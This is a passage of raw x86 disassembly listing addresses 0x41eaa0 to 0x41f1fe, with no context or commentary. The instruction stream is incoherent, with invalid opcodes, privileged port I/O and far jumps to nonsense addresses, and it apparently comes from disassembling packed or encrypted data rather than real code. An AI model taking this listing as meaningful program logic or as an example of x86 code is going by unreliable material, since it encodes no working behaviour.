  41eaa0:	lds    ebx,FWORD PTR [ebx+0x686e947b]
  41eaa6:	inc    edi
  41eaa7:	lods   eax,DWORD PTR ds:[esi]
  41eaa8:	mov    ebp,0x2db4f04a
  41eaad:	sti    
  41eaae:	mov    al,0x4
  41eab0:	mov    cl,0x56
  41eab2:	push   es
  41eab3:	fcomi  st,st(6)
  41eab5:	fld    TBYTE PTR [ecx+0x73ef9301]
  41eabb:	bound  edx,QWORD PTR [ebp+0x3f]
  41eabe:	push   0x6c
  41eac0:	xor    DWORD PTR [ebp+0x28b6e4e3],edx
  41eac6:	pop    es
  41eac7:	inc    eax
  41eac8:	sahf   
  41eac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaca:	cmp    eax,DWORD PTR [esi]
  41eacc:	adc    eax,0x79708af5
  41ead1:	ins    DWORD PTR es:[edi],dx
  41ead2:	fs ins BYTE PTR es:[edi],dx
  41ead4:	das    
  41ead5:	popa   
  41ead6:	mov    bl,0x24
  41ead8:	arpl   WORD PTR [edi+0xf45f9ba],ax
  41eade:	mov    eax,ds:0xb04e63ec
  41eae3:	inc    eax
  41eae4:	pushf  
  41eae5:	sbb    dh,dh
  41eae7:	addr16 mov bh,0xab
  41eaea:	mov    DWORD PTR [esi],ebp
  41eaec:	inc    ebp
  41eaed:	mov    ds:0xd3286fcb,al
  41eaf2:	jae    0x41eb24
  41eaf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaf5:	xchg   BYTE PTR [eax-0x6],bh
  41eaf8:	or     edx,ebx
  41eafa:	mov    al,0x4
  41eafc:	pop    eax
  41eafd:	mov    bh,BYTE PTR [eax]
  41eaff:	nop
  41eb00:	and    ax,0xd6b6
  41eb04:	pop    ds
  41eb05:	push   edi
  41eb06:	loope  0x41eb1d
  41eb08:	jp     0x41eb61
  41eb0a:	ds inc edx
  41eb0c:	je     0x41eb11
  41eb0e:	mov    ebp,0xd055d124
  41eb13:	gs xchg esi,eax
  41eb15:	aas    
  41eb16:	xchg   esp,eax
  41eb17:	sbb    al,0xfe
  41eb19:	or     eax,0x272bebb6
  41eb1e:	mov    al,0x23
  41eb20:	adc    edi,eax
  41eb22:	mov    ecx,0x1643f5c4
  41eb27:	mov    eax,0xeb8620c5
  41eb2c:	sub    al,0x72
  41eb2e:	lods   al,BYTE PTR ds:[esi]
  41eb2f:	sub    eax,0x6d73c779
  41eb34:	sbb    al,0x29
  41eb36:	arpl   WORD PTR [ebp+ebx*2+0x4a707441],cx
  41eb3d:	retf   
  41eb3e:	imul   esi,DWORD PTR [esi+0x37790c31],0xffffff9a
  41eb45:	add    ebp,DWORD PTR [eax-0x4dcfdbf2]
  41eb4b:	pop    es
  41eb4c:	sub    ch,BYTE PTR [ecx-0x1ad52ce8]
  41eb52:	push   ss
  41eb53:	dec    edi
  41eb54:	fmul   QWORD PTR [eax+0x3645a856]
  41eb5a:	xor    eax,0xec73a6e7
  41eb5f:	sub    al,0x23
  41eb61:	pop    ecx
  41eb62:	push   ss
  41eb63:	ins    DWORD PTR es:[edi],dx
  41eb64:	sub    cl,BYTE PTR [ebp-0x8]
  41eb67:	nop
  41eb68:	iret   
  41eb69:	dec    ebp
  41eb6a:	cmovb  esp,DWORD PTR [edx]
  41eb6d:	pop    ecx
  41eb6e:	icebp  
  41eb6f:	gs out dx,eax
  41eb71:	mov    cl,0x10
  41eb73:	dec    ebx
  41eb74:	into   
  41eb75:	leave  
  41eb76:	shl    DWORD PTR ds:0x538b0975,cl
  41eb7c:	sub    BYTE PTR [eax+0x62226cb8],bl
  41eb82:	imul   edx,DWORD PTR [ebx-0x4a91085b],0xef08bcb5
  41eb8c:	add    DWORD PTR [ebx-0x56c3a705],esp
  41eb92:	inc    cl
  41eb94:	xor    esp,DWORD PTR [eax+0x50848c46]
  41eb9a:	mov    esi,?
  41eb9c:	pop    esp
  41eb9d:	stos   BYTE PTR es:[edi],al
  41eb9e:	mov    al,0xd0
  41eba0:	lahf   
  41eba1:	mov    edx,0x156becdc
  41eba6:	sub    al,0x40
  41eba8:	jns    0x41eb4d
  41ebaa:	sub    DWORD PTR [ebx-0x18],esi
  41ebad:	pop    ebx
  41ebaf:	mov    edx,0xe59be709
  41ebb4:	sub    DWORD PTR [esi+eiz*2+0x54a881f2],edi
  41ebbb:	push   edx
  41ebbc:	aad    0x29
  41ebbe:	adc    eax,0x695931ee
  41ebc3:	mov    ah,BYTE PTR ds:0x67617e99
  41ebc9:	out    0x2f,eax
  41ebcb:	iret   
  41ebcc:	mov    esi,0x2871bb9d
  41ebd1:	mov    ah,0xaa
  41ebd3:	aad    0xff
  41ebd5:	adc    eax,0x3e6cb325
  41ebda:	and    al,0x45
  41ebdc:	and    BYTE PTR [ecx],al
  41ebde:	pop    edi
  41ebdf:	psubw  mm7,QWORD PTR [eax]
  41ebe2:	lods   al,BYTE PTR ds:[esi]
  41ebe3:	ins    DWORD PTR es:[edi],dx
  41ebe4:	mov    edi,0x337ee3f
  41ebe9:	mov    edx,0xa84da3b7
  41ebee:	or     eax,ebx
  41ebf0:	in     eax,dx
  41ebf1:	ins    BYTE PTR es:[edi],dx
  41ebf2:	pop    eax
  41ebf3:	adc    ax,0xb053
  41ebf7:	out    0x49,al
  41ebf9:	jmp    0xa95beaf1
  41ebfe:	push   es
  41ebff:	data16 rcr bl,1
  41ec02:	inc    edx
  41ec03:	pop    es
  41ec04:	popf   
  41ec05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec06:	jnp    0x41ebbe
  41ec08:	lea    edx,[edx+0x314e3b44]
  41ec0e:	pop    ebp
  41ec0f:	xchg   esi,eax
  41ec10:	(bad)  
  41ec11:	mov    eax,ds:0x4ae074b2
  41ec16:	jp     0x41ec31
  41ec18:	aaa    
  41ec19:	inc    ebp
  41ec1a:	mov    al,ds:0xb63f81d3
  41ec1f:	in     eax,0xf5
  41ec21:	adc    esi,DWORD PTR [ecx]
  41ec23:	sar    BYTE PTR [ebx-0x6],cl
  41ec26:	mov    dl,0x44
  41ec28:	xlat   BYTE PTR ds:[ebx]
  41ec29:	mov    ebp,0xcec66bf1
  41ec2e:	pop    es
  41ec2f:	jbe    0x41ec4b
  41ec31:	popa   
  41ec32:	mov    ds:0xb8f4ca05,eax
  41ec37:	push   edx
  41ec38:	in     eax,0x5c
  41ec3a:	add    DWORD PTR [edi-0x4b],esi
  41ec3d:	mov    ebp,0xdf4e9dd
  41ec42:	mov    edx,0xb524edfa
  41ec47:	hlt    
  41ec48:	cmp    al,0xba
  41ec4a:	push   cs
  41ec4b:	xchg   esp,eax
  41ec4c:	gs into 
  41ec4e:	shr    ebx,cl
  41ec50:	cdq    
  41ec51:	lahf   
  41ec52:	mov    ah,0xb3
  41ec54:	sbb    al,0xa9
  41ec56:	mov    ?,WORD PTR [edx-0x2b63d8e5]
  41ec5c:	jns    0x41ebf7
  41ec5e:	imul   eax,eax,0xffffffd7
  41ec61:	add    eax,0xd8b377fe
  41ec66:	scas   al,BYTE PTR es:[edi]
  41ec67:	or     ebx,eax
  41ec69:	popf   
  41ec6a:	call   0xd1ef:0xec1081d5
  41ec71:	sahf   
  41ec72:	mov    ebx,0xff0dc381
  41ec77:	sar    DWORD PTR ds:[ecx-0x75],cl
  41ec7b:	rol    BYTE PTR [eax+0x14],cl
  41ec7e:	mov    ch,0x44
  41ec80:	xchg   ebp,eax
  41ec81:	stos   DWORD PTR es:[edi],eax
  41ec82:	inc    esp
  41ec83:	jbe    0x41ecca
  41ec85:	and    al,0x3b
  41ec87:	jmp    0x41ecb6
  41ec89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec8a:	pop    esi
  41ec8b:	push   ebp
  41ec8c:	cmp    DWORD PTR cs:[ebx-0x1098a976],edx
  41ec93:	sbb    ax,0xc7ac
  41ec97:	mov    ebx,0xecfba2ce
  41ec9c:	imul   eax,DWORD PTR [esi-0x29],0x24
  41eca0:	addr16 jg 0x41eca9
  41eca3:	int    0x4e
  41eca5:	inc    ecx
  41eca6:	mov    ecx,0x325cb5a4
  41ecab:	mov    edi,0xeb8b9305
  41ecb0:	cmc    
  41ecb1:	arpl   WORD PTR [ecx],bx
  41ecb3:	jg     0x41ecf1
  41ecb5:	call   FWORD PTR [bx+di]
  41ecb8:	and    eax,0xc34beec
  41ecbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecbe:	inc    eax
  41ecbf:	stos   DWORD PTR es:[edi],eax
  41ecc0:	dec    ebx
  41ecc1:	rcl    BYTE PTR [ebx],0x6d
  41ecc4:	push   ebp
  41ecc5:	inc    esi
  41ecc6:	mov    ebx,0x585e8d74
  41eccb:	cs in  al,0x4d
  41ecce:	mov    edx,0x77519604
  41ecd3:	push   ebp
  41ecd4:	adc    eax,0xd6eec131
  41ecd9:	and    BYTE PTR [edi],bl
  41ecdb:	aaa    
  41ecdc:	pop    ebx
  41ecdd:	fsubr  st,st(5)
  41ecdf:	inc    ebp
  41ece0:	and    DWORD PTR [edx-0x46],edi
  41ece3:	fs adc bl,bh
  41ece6:	(bad)  
  41ece7:	xchg   edx,eax
  41ece8:	cdq    
  41ece9:	mov    ah,BYTE PTR [ebp-0x53]
  41ecec:	std    
  41eced:	xchg   edx,eax
  41ecee:	push   es
  41ecef:	dec    ebp
  41ecf0:	adc    DWORD PTR [ebx],0x6202f611
  41ecf6:	cmp    ebp,DWORD PTR [ecx-0x2ca736e6]
  41ecfc:	cmp    eax,0x3676a98c
  41ed01:	sahf   
  41ed02:	stos   DWORD PTR es:[edi],eax
  41ed03:	inc    eax
  41ed04:	stos   DWORD PTR es:[edi],eax
  41ed05:	mov    dh,BYTE PTR [eax+0xe1bd2b5]
  41ed0b:	dec    eax
  41ed0c:	mov    eax,ds:0x5e559456
  41ed11:	fidivr DWORD PTR [eax-0x3a5e4ee5]
  41ed17:	sbb    edi,DWORD PTR [esi]
  41ed19:	mov    esp,0x1866748b
  41ed1e:	push   esp
  41ed1f:	int3   
  41ed20:	and    al,0x37
  41ed22:	jge    0x41ed9c
  41ed24:	sbb    edi,ecx
  41ed26:	sahf   
  41ed27:	and    DWORD PTR [ecx-0x6e],ebx
  41ed2a:	pop    ebx
  41ed2b:	out    0xfd,eax
  41ed2d:	mov    ds:0xc8440e6b,al
  41ed32:	je     0x41ed48
  41ed34:	ja     0x41ecf9
  41ed36:	pop    es
  41ed37:	push   0x697b6db
  41ed3c:	(bad)  
  41ed3e:	mov    ah,0xec
  41ed40:	push   ds
  41ed41:	add    BYTE PTR [ebx+eiz*2-0x6cba68e3],bh
  41ed48:	mov    esi,0x8dca73cc
  41ed4d:	or     BYTE PTR [ecx-0x18],bh
  41ed50:	outs   dx,DWORD PTR ds:[esi]
  41ed51:	lock mov ch,0x46
  41ed54:	in     eax,0xf9
  41ed56:	cmc    
  41ed57:	in     eax,dx
  41ed58:	mov    al,ds:0x1df06eec
  41ed5d:	imul   edx,DWORD PTR [ebx+eiz*8-0x66],0x501eff49
  41ed65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed66:	fwait
  41ed67:	or     BYTE PTR [ebp-0x52],al
  41ed6a:	ins    BYTE PTR es:[edi],dx
  41ed6b:	shl    edx,1
  41ed6d:	ret    0xc63b
  41ed70:	dec    ebp
  41ed71:	ins    BYTE PTR es:[edi],dx
  41ed72:	mov    ah,0xc4
  41ed74:	jge    0x41edd4
  41ed76:	push   edx
  41ed77:	inc    edi
  41ed78:	les    esp,FWORD PTR ss:[ebp-0x1f47d8e2]
  41ed7f:	ret    
  41ed80:	pop    ebx
  41ed81:	repnz mov edi,0xc71355ce
  41ed87:	test   BYTE PTR [edi],al
  41ed89:	lock inc ecx
  41ed8b:	out    dx,eax
  41ed8c:	pusha  
  41ed8d:	xor    BYTE PTR [bp+di],dl
  41ed90:	push   edx
  41ed91:	mov    al,ds:0xd0c44a0b
  41ed96:	and    DWORD PTR [edx],0xe98dcd89
  41ed9c:	sahf   
  41ed9d:	dec    ecx
  41ed9e:	mov    dl,0x24
  41eda0:	imul   ecx,edi,0x58
  41eda3:	fcom   st(5)
  41eda5:	inc    esi
  41eda6:	xchg   ebp,eax
  41eda7:	out    dx,eax
  41eda8:	test   al,0xbd
  41edaa:	(bad)  
  41edab:	xlat   BYTE PTR ds:[bx]
  41edad:	sub    dl,BYTE PTR [ebx]
  41edaf:	jmp    DWORD PTR [ebx*2-0x6991e993]
  41edb6:	inc    ecx
  41edb7:	push   ebp
  41edb8:	pop    ecx
  41edb9:	int3   
  41edba:	mov    al,0xc5
  41edbc:	iret   
  41edbd:	pop    ebp
  41edbe:	mov    dl,0x74
  41edc0:	dec    esi
  41edc1:	adc    eax,0xfb80ef35
  41edc6:	mov    ch,0xb4
  41edc8:	jp     0x41ed9e
  41edca:	xchg   ebx,eax
  41edcb:	xor    BYTE PTR [ebp-0x621731ba],0x57
  41edd2:	jo     0x41ed7b
  41edd4:	mov    ebx,DWORD PTR [ecx+0x224db13e]
  41edda:	pop    ecx
  41eddb:	sbb    esp,DWORD PTR [esi]
  41eddd:	mov    esi,DWORD PTR [edi-0x48410a42]
  41ede3:	lock inc eax
  41ede5:	or     al,0x8c
  41ede7:	jecxz  0x41ee06
  41ede9:	sub    DWORD PTR [edi+0x3b34a14f],ecx
  41edef:	or     DWORD PTR [edx],ecx
  41edf1:	aaa    
  41edf2:	or     al,0x3f
  41edf4:	out    0x82,eax
  41edf6:	out    dx,eax
  41edf7:	addr16 int 0x9c
  41edfa:	and    esp,DWORD PTR [ebp+0x15]
  41edfd:	fdiv   st(6),st
  41edff:	cs inc esi
  41ee01:	jo     0x41eda0
  41ee03:	in     al,0xb0
  41ee05:	inc    ebx
  41ee06:	mov    ah,0xd4
  41ee08:	pop    edi
  41ee09:	pop    esi
  41ee0a:	repz loope 0x41ee82
  41ee0d:	hlt    
  41ee0e:	nop
  41ee0f:	hlt    
  41ee10:	jmp    0x1d3b31ea
  41ee15:	cdq    
  41ee16:	mov    al,0x6
  41ee18:	loope  0x41edd0
  41ee1a:	repnz call 0x5535:0xb8b2aa37
  41ee22:	mov    eax,ds:0xe1363beb
  41ee27:	inc    ebx
  41ee28:	pop    ss
  41ee29:	cmp    DWORD PTR [ebp+0x61],ebx
  41ee2c:	xor    ch,al
  41ee2e:	mov    eax,ds:0xbba00623
  41ee33:	fld    TBYTE PTR [ebp+0x45472ee1]
  41ee39:	xchg   BYTE PTR [esi+0x8],bh
  41ee3c:	popa   
  41ee3d:	sbb    bl,ch
  41ee3f:	test   BYTE PTR [ecx],al
  41ee41:	mov    ds:0x9cc8e0c7,al
  41ee46:	fwait
  41ee47:	or     al,0x66
  41ee49:	xor    cl,BYTE PTR [ecx]
  41ee4b:	push   edx
  41ee4c:	jp     0x41eebb
  41ee4e:	pop    esp
  41ee4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee50:	aaa    
  41ee51:	scas   al,BYTE PTR es:[edi]
  41ee52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee53:	add    eax,0x1567d132
  41ee58:	and    esi,DWORD PTR [eax]
  41ee5a:	cwde   
  41ee5b:	hlt    
  41ee5c:	ins    DWORD PTR es:[edi],dx
  41ee5d:	test   al,0xcb
  41ee5f:	sar    BYTE PTR [edx+0x65],1
  41ee62:	ficomp DWORD PTR [ebx+0x6fb639dc]
  41ee68:	jg     0x41eebe
  41ee6a:	mov    bh,0x24
  41ee6c:	faddp  st(6),st
  41ee6e:	cld    
  41ee6f:	dec    eax
  41ee70:	out    0x75,eax
  41ee72:	mov    ecx,0xa2c7a5b5
  41ee77:	out    0x53,al
  41ee79:	sbb    eax,0xab76e251
  41ee7e:	mov    edi,0xb6cdfd84
  41ee83:	sub    eax,0xefbcfc25
  41ee88:	into   
  41ee89:	jne    0x41ee10
  41ee8b:	add    BYTE PTR ss:[ebp+0x42651271],bh
  41ee92:	jae    0x41ee88
  41ee94:	bound  esi,QWORD PTR [edx+0x127d1022]
  41ee9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee9b:	mov    ecx,0xf2bbe5c1
  41eea0:	pop    eax
  41eea1:	mov    WORD PTR [edx-0x5f9c2a3c],?
  41eea7:	daa    
  41eea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eea9:	outs   dx,BYTE PTR ds:[esi]
  41eeaa:	test   dl,ch
  41eeac:	retf   
  41eead:	jbe    0x41eeab
  41eeaf:	pop    edx
  41eeb0:	and    cl,BYTE PTR [ecx-0x4d]
  41eeb3:	(bad)  
  41eeb4:	loop   0x41eebd
  41eeb6:	mov    esi,0x9d66b6a0
  41eebb:	sbb    edx,DWORD PTR [eax-0x64]
  41eebe:	xlat   BYTE PTR ds:[ebx]
  41eebf:	sar    DWORD PTR [edx+esi*2],cl
  41eec2:	or     BYTE PTR [ecx+0x1f],bh
  41eec5:	stc    
  41eec6:	dec    ecx
  41eec7:	add    ecx,edi
  41eec9:	out    0xfe,al
  41eecb:	xchg   ebx,eax
  41eecc:	mov    BYTE PTR [esi+0x40d00c7b],dh
  41eed2:	inc    eax
  41eed3:	cmp    BYTE PTR [ebp-0x4c9e4167],bl
  41eed9:	or     DWORD PTR [edx+0x23a70b38],ebp
  41eedf:	pop    eax
  41eee0:	inc    edx
  41eee1:	aad    0x85
  41eee3:	xor    al,BYTE PTR [esi]
  41eee5:	faddp  st(2),st
  41eee7:	push   edi
  41eee8:	jb     0x41ee88
  41eeea:	stos   BYTE PTR es:[edi],al
  41eeeb:	mov    dh,0xe6
  41eeed:	sbb    ah,al
  41eeef:	fs or  dh,0xb3
  41eef3:	test   BYTE PTR [edi-0x4a2b17cd],ch
  41eef9:	or     eax,0xc10e511
  41eefe:	cmp    eax,0xf0792a3d
  41ef03:	sbb    edx,DWORD PTR [ebx+0x19850534]
  41ef09:	or     ah,bh
  41ef0b:	lods   al,BYTE PTR ds:[esi]
  41ef0c:	test   BYTE PTR [edi-0x2ac0088d],ah
  41ef12:	retf   
  41ef13:	icebp  
  41ef14:	sbb    BYTE PTR [esi],bl
  41ef16:	rep ins DWORD PTR es:[edi],dx
  41ef18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef19:	inc    ecx
  41ef1a:	fucomip st,st(6)
  41ef1c:	xor    al,0x5a
  41ef1e:	imul   eax,DWORD PTR [edx+edx*1-0x66],0x6e
  41ef23:	pop    ebp
  41ef24:	xchg   ebx,eax
  41ef25:	mov    al,ds:0xb6785aa9
  41ef2a:	push   esi
  41ef2b:	mov    edi,0xe0a278f7
  41ef30:	popa   
  41ef31:	test   DWORD PTR [ebp-0x18],esi
  41ef34:	push   ebp
  41ef35:	or     cl,BYTE PTR [esi-0x7d]
  41ef38:	sbb    ebp,DWORD PTR [ecx+0x5ab083d5]
  41ef3e:	rcr    DWORD PTR [esi],1
  41ef40:	shl    BYTE PTR [ecx-0x1f6ed835],1
  41ef46:	cmp    bl,ch
  41ef48:	mov    edi,0x8f438d39
  41ef4d:	and    eax,0xeb9804bf
  41ef52:	pushf  
  41ef53:	dec    esi
  41ef54:	push   edi
  41ef55:	and    DWORD PTR [ebx+0x2ef635de],esi
  41ef5b:	out    dx,eax
  41ef5c:	sub    al,0x76
  41ef5e:	pop    ebx
  41ef5f:	push   0x57
  41ef61:	jge    0x41ef1b
  41ef63:	mov    ah,0xc2
  41ef65:	mov    BYTE PTR [ecx],bl
  41ef67:	loope  0x41ef9f
  41ef69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef6a:	std    
  41ef6b:	pop    ss
  41ef6c:	jae    0x41ef46
  41ef6e:	pop    ds
  41ef6f:	fcmovne st,st(1)
  41ef71:	push   ebx
  41ef72:	xor    eax,0x5cb8615d
  41ef77:	and    DWORD PTR gs:[ecx+0x32],edi
  41ef7b:	sbb    BYTE PTR [edx+0x6e],ah
  41ef7e:	pop    ecx
  41ef7f:	jmp    0xa4f:0xe855a4f5
  41ef86:	dec    esp
  41ef87:	pop    ebp
  41ef88:	idiv   BYTE PTR [edx+0x14]
  41ef8b:	out    dx,eax
  41ef8c:	xor    ebp,DWORD PTR [ecx-0x4153f63a]
  41ef92:	in     eax,dx
  41ef93:	std    
  41ef94:	pop    esi
  41ef95:	xchg   dh,al
  41ef97:	pusha  
  41ef98:	fsub   DWORD PTR [ebp+0x53062ec6]
  41ef9e:	test   BYTE PTR [eiz*1+0x1d616165],cl
  41efa5:	mov    ecx,0x8f12787d
  41efaa:	les    ebx,FWORD PTR [edi]
  41efac:	dec    ecx
  41efad:	std    
  41efae:	mov    esp,0x3b9daa7a
  41efb3:	outs   dx,DWORD PTR ds:[esi]
  41efb4:	xchg   DWORD PTR [ebp+0x69196dcf],edx
  41efba:	mov    dh,0x66
  41efbc:	rcl    BYTE PTR [edx+0x7e],cl
  41efbf:	pushf  
  41efc0:	push   edx
  41efc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efc2:	retf   
  41efc3:	(bad)  
  41efc4:	pop    ebx
  41efc5:	add    eax,0xbbf76fb3
  41efca:	push   0x6
  41efcc:	dec    ebx
  41efcd:	hlt    
  41efce:	mov    edx,0x7583c854
  41efd3:	fwait
  41efd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efd5:	mov    ecx,0x3232efff
  41efda:	in     eax,0xa7
  41efdc:	(bad)  
  41efde:	not    DWORD PTR [edx]
  41efe0:	adc    eax,0x54efebb9
  41efe5:	adc    dl,al
  41efe7:	push   ebx
  41efe8:	es lock push ebx
  41efeb:	fimul  DWORD PTR [edx+0x543fad7b]
  41eff1:	inc    esi
  41eff2:	aam    0xf2
  41eff4:	and    bh,BYTE PTR [ecx]
  41eff6:	inc    ebp
  41eff7:	loopne 0x41ef8b
  41eff9:	xor    al,0x73
  41effb:	cld    
  41effc:	xor    eax,0xdc9d9f4c
  41f001:	push   0xffffff85
  41f003:	pop    ebp
  41f004:	int    0x4b
  41f006:	or     cl,dh
  41f008:	xlat   BYTE PTR ds:[ebx]
  41f009:	pop    ebx
  41f00a:	(bad)  
  41f00b:	clc    
  41f00c:	and    ch,BYTE PTR [eax-0x39]
  41f00f:	sbb    eax,ebp
  41f011:	iret   
  41f012:	rcl    esp,0x5a
  41f015:	mov    dl,0x7b
  41f017:	mov    cl,0x45
  41f019:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f01a:	jnp    0x41f02f
  41f01c:	daa    
  41f01d:	repnz sub eax,0xc280d5a6
  41f023:	cs pop ebx
  41f025:	mov    ebx,0x1f92f4b9
  41f02a:	adc    DWORD PTR [ecx-0x133c0f6b],esi
  41f030:	je     0x41f09b
  41f032:	fild   QWORD PTR [esi+0x1f]
  41f035:	fstp   DWORD PTR [eax+ebp*8]
  41f038:	call   0x8b9a:0x70b972f5
  41f03f:	in     al,dx
  41f040:	mov    ?,WORD PTR [edx+0x58]
  41f043:	iret   
  41f044:	mov    ebx,edx
  41f046:	xor    bh,0x20
  41f049:	stos   BYTE PTR es:[edi],al
  41f04a:	enter  0x79d4,0xac
  41f04e:	jno    0x41f0ad
  41f050:	sbb    al,0x1b
  41f052:	dec    edx
  41f053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f054:	test   eax,0x49e0735f
  41f059:	add    dh,BYTE PTR [eax-0xafae19c]
  41f05f:	je     0x41f07b
  41f061:	sub    DWORD PTR [ebp+0x6cf71a6f],esi
  41f067:	xchg   esp,eax
  41f068:	ror    esi,0xb
  41f06b:	mov    edx,0x6af40336
  41f070:	xchg   edi,eax
  41f071:	xchg   ebx,eax
  41f072:	sub    eax,0xa6b8615d
  41f077:	xchg   edi,eax
  41f078:	test   cl,bh
  41f07a:	mov    ebp,0x69322bc4
  41f07f:	jecxz  0x41f0b6
  41f081:	xor    DWORD PTR [eax-0x11],ebp
  41f084:	fs icebp 
  41f086:	cmp    BYTE PTR [esi],dl
  41f088:	and    eax,0xa317d7b9
  41f08d:	adc    al,0x4f
  41f08f:	enter  0x987a,0xfc
  41f093:	adc    ah,BYTE PTR [ebx-0x3d95c53f]
  41f099:	mov    esi,0x891834b0
  41f09e:	test   al,dl
  41f0a0:	or     al,0x4a
  41f0a2:	pop    esp
  41f0a3:	loope  0x41f094
  41f0a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0a6:	imul   eax,edx,0x5d
  41f0a9:	xchg   si,ax
  41f0ab:	imul   esp,DWORD PTR [edx],0x43
  41f0ae:	and    dh,0xb
  41f0b1:	cli    
  41f0b2:	sub    ecx,DWORD PTR [eax+eiz*8]
  41f0b5:	neg    ch
  41f0b7:	gs mov ecx,0xef897ba7
  41f0bd:	xchg   ebp,eax
  41f0be:	mov    eax,eax
  41f0c0:	and    al,0xf9
  41f0c2:	in     al,dx
  41f0c3:	rcl    DWORD PTR [edx-0x7b21cb89],0xa0
  41f0ca:	sbb    edi,DWORD PTR [edx+0x6b]
  41f0cd:	cmp    ah,BYTE PTR [eax+0x23e88d97]
  41f0d3:	(bad)  
  41f0d4:	mov    dl,0xac
  41f0d6:	mov    dl,0x84
  41f0d8:	cmp    edi,DWORD PTR [eax-0x25]
  41f0db:	test   DWORD PTR [edi+0x4b],esi
  41f0de:	iret   
  41f0df:	or     BYTE PTR [ebp+0x1d],ah
  41f0e2:	js     0x41f0d7
  41f0e4:	icebp  
  41f0e5:	stc    
  41f0e6:	loop   0x41f143
  41f0e8:	push   es
  41f0e9:	jae    0x41f09d
  41f0eb:	add    al,0xa9
  41f0ed:	sub    DWORD PTR [edx-0x745a4ebe],esi
  41f0f3:	jb     0x41f0e3
  41f0f5:	push   edi
  41f0f6:	mov    edx,0x5f89760f
  41f0fb:	enter  0xe923,0x92
  41f0ff:	in     al,0x77
  41f101:	data16 or BYTE PTR [eax],ch
  41f104:	sbb    ah,BYTE PTR [ebp-0x81be4e5]
  41f10a:	dec    eax
  41f10b:	fmul   DWORD PTR [eax+0x50]
  41f10e:	es pop es
  41f110:	cdq    
  41f111:	mov    BYTE PTR [eax-0x612a960c],bh
  41f117:	aam    0x65
  41f119:	dec    ebx
  41f11a:	xchg   esi,edi
  41f11c:	aad    0xef
  41f11e:	adc    al,0x56
  41f120:	bound  edx,QWORD PTR [edi]
  41f122:	jo     0x41f192
  41f124:	out    0x11,al
  41f126:	mov    edx,0x21247b4
  41f12b:	cwde   
  41f12c:	xchg   esi,eax
  41f12d:	jo     0x41f18a
  41f12f:	pushf  
  41f130:	sub    DWORD PTR [ecx],esp
  41f132:	aad    0xbb
  41f134:	or     al,0x1d
  41f136:	sub    eax,eax
  41f138:	sbb    cl,ch
  41f13a:	xchg   ebp,eax
  41f13b:	ins    DWORD PTR es:[edi],dx
  41f13c:	xchg   esi,eax
  41f13d:	push   edi
  41f13e:	mov    BYTE PTR [edi+0x3e],dh
  41f141:	mov    ds:0x9aa109db,eax
  41f146:	arpl   WORD PTR [ebx],ax
  41f148:	sub    BYTE PTR [edi-0x159dbf76],bl
  41f14e:	cwde   
  41f14f:	test   DWORD PTR [ebx-0x4513d585],edx
  41f155:	xchg   esp,eax
  41f156:	or     al,0xcc
  41f158:	or     DWORD PTR [eax],0x67
  41f15b:	stos   BYTE PTR es:[edi],al
  41f15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f15d:	mov    WORD PTR [esi-0x4145791c],?
  41f163:	sbb    bl,BYTE PTR [edi]
  41f165:	jmp    0x5e084d0e
  41f16a:	sub    eax,0x887785fd
  41f16f:	out    0x35,al
  41f171:	xchg   ebx,eax
  41f172:	test   eax,0xd5d762d8
  41f177:	ja     0x41f1cf
  41f179:	or     DWORD PTR [eax-0x5b],0xffffffa6
  41f17d:	sahf   
  41f17e:	arpl   cx,dx
  41f180:	add    al,BYTE PTR [ebx]
  41f182:	fimul  DWORD PTR [ebx-0x2b]
  41f185:	scas   eax,DWORD PTR es:[edi]
  41f186:	out    0xec,al
  41f188:	js     0x41f1d8
  41f18a:	loopne 0x41f1d2
  41f18c:	imul   BYTE PTR [ecx-0x572cb15b]
  41f192:	test   DWORD PTR [ebx],esi
  41f194:	rcr    BYTE PTR [ebp-0x5001b9fa],0xeb
  41f19b:	icebp  
  41f19c:	mov    ds:0xa9d64c95,al
  41f1a1:	es or  ebx,esi
  41f1a4:	pop    edi
  41f1a5:	or     BYTE PTR [esi+eax*8-0x7b4dd1ec],cl
  41f1ac:	xor    bh,BYTE PTR [edx+0x323680b6]
  41f1b2:	pop    edi
  41f1b3:	enter  0x8f4b,0x37
  41f1b7:	sahf   
  41f1b8:	sbb    BYTE PTR [edi],al
  41f1ba:	enter  0x1612,0x49
  41f1be:	int    0x69
  41f1c0:	(bad)  
  41f1c1:	hlt    
  41f1c2:	jnp    0x41f237
  41f1c4:	cmp    ah,BYTE PTR [esi+0x69e78ddb]
  41f1ca:	fld    TBYTE PTR [ecx-0x64]
  41f1cd:	xchg   BYTE PTR [ebp+0x11],bh
  41f1d0:	cmc    
  41f1d1:	retf   0x24ec
  41f1d4:	mov    dl,0x51
  41f1d6:	cdq    
  41f1d7:	mov    esi,0x65524e6f
  41f1dc:	sub    eax,0x1a9bef3a
  41f1e1:	pop    ecx
  41f1e2:	ins    DWORD PTR es:[edi],dx
  41f1e3:	dec    BYTE PTR [eax-0x69]
  41f1e6:	inc    esi
  41f1e7:	sbb    DWORD PTR [ebx],0x5c932a99
  41f1ed:	inc    esi
  41f1ee:	lds    eax,FWORD PTR [esp+esi*2-0x59]
  41f1f2:	sub    eax,DWORD PTR [esp+ecx*4]
  41f1f5:	loopne 0x41f200
  41f1f7:	imul   ebp,DWORD PTR gs:[ebx],0x5a1c74f8
  41f1fe:	xchg   edi,eax
